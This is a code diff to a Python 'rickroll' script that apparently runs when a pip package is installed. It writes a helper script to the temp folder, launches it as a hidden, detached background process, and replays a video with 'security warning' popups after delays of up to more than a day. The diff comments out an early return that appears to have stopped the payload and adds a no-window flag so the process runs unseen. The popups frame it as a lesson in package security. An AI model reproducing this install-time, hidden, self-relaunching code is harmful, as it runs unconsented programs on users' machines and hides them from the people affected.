@@ -119,7 +119,7 @@ def main():
             "This demonstrates that pip install can run arbitrary code.\\n\\n"
             "LESSON: Always verify packages before installing!"
         )
-        return
+        #return
     
     tmpdir = Path(tempfile.gettempdir()) / "rickroll_tmp"
     tmpdir.mkdir(exist_ok=True)
@@ -149,30 +149,36 @@ def main():
     time.sleep(3)
     
     show_popup_message(
-        "Security Warning",
+        "SECURITY WARNING",
         "You just got rickrolled!\\n\\n"
-        "This is an educational demonstration about PyPI security.\\n\\n"
-        "When you run pip install, the packages you are installing can run"
-        "arbitrary code on your system. In this case, all it did was rickroll."
-        "But malicious packages could steal your bank info, send emails"
+        "WARNING:\\n\\n"
+        "When you run pip install, you are letting the author of the package "
+        "run whatever they want on your computer. Evil programmers can do "
+        "evil things like steal your bank info, send emails "
         "impersonating you, or use your computer to launch attacks on the"
         "US government.\\n\\n"
-        "LESSON: Always verify packages before installing them!\\n"
-        "Check the source code, verify the publisher, and be cautious "
-        "with unfamiliar packages."
+        "LESSON: \\n\\nOnly install trusted packages."
     )
 
     import random
     time.sleep(60*10 + random.random()*60*20)
     play_video_background(str(persistent_path), with_audio=args.with_audio)
     show_popup_message(
-        "Remember: once someone has access to your computer for just a fraction of a second, they have access to your computer forever! There is no way to reliably get rid of malware except by totally erasing your harddrive and reinstalling."
+        "SECURITY WARNING",
+        "REMEMBER: Once someone has access to your computer for just a "
+        "fraction of a second, they have access to your computer forever! "
+        "There is no way to reliably get rid of malware except by totally "
+        "erasing your hard drive and reinstalling."
     )
 
     time.sleep(60*10 + random.random()*60*20 + 24*60*60)
     play_video_background(str(persistent_path), with_audio=args.with_audio)
     show_popup_message(
-        "Remember: once someone has access to your computer for just a fraction of a second, they have access to your computer forever! There is no way to reliably get rid of malware except by totally erasing your harddrive and reinstalling.\n\n(This is the last time you'll get this rickroll... I promise..."
+        "SECURITY WARNING",
+        "REMEMBER: Once someone has access to your computer for just a "
+        "fraction of a second, they have access to your computer forever! "
+        "There is no way to reliably get rid of malware except by totally "
+        "erasing your hard drive and reinstalling."
     )
 
 
@@ -231,7 +237,8 @@ def rickroll(with_audio=False):
     # Write helper script to temp file
     helper_script = get_helper_script()
     script_path = Path(tempfile.gettempdir()) / "rickroll_helper.py"
-    script_path.write_text(helper_script)
+    script_path.write_text(helper_script, encoding='utf-8')
+    time.sleep(1)
     
     # Launch helper script as a separate, detached process
     cmd = [sys.executable, str(script_path)]
@@ -243,24 +250,31 @@ def rickroll(with_audio=False):
             # Windows: use CREATE_NEW_PROCESS_GROUP and DETACHED_PROCESS
             DETACHED_PROCESS = 0x00000008
             CREATE_NEW_PROCESS_GROUP = 0x00000200
+            CREATE_NO_WINDOW = 0x08000000
             subprocess.Popen(
                 cmd,
-                creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
+                creationflags=CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
                 stdin=subprocess.DEVNULL,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
             )
         else:
             # Unix: use start_new_session to detach from parent
-            subprocess.Popen(
+            proc = subprocess.Popen(
                 cmd,
                 start_new_session=True,
                 stdin=subprocess.DEVNULL,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
+                #stdout=subprocess.PIPE,
+                #stderr=subprocess.PIPE,
+                #text=True,
             )
+            #out, err = proc.communicate()
+            #raise ValueError(out+err)
         print("Background process started for video playback...")
     except Exception as e:
+    #except AssertionError as e:
         print(f"Failed to start background process: {e}")
         # Fallback to browser
         url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
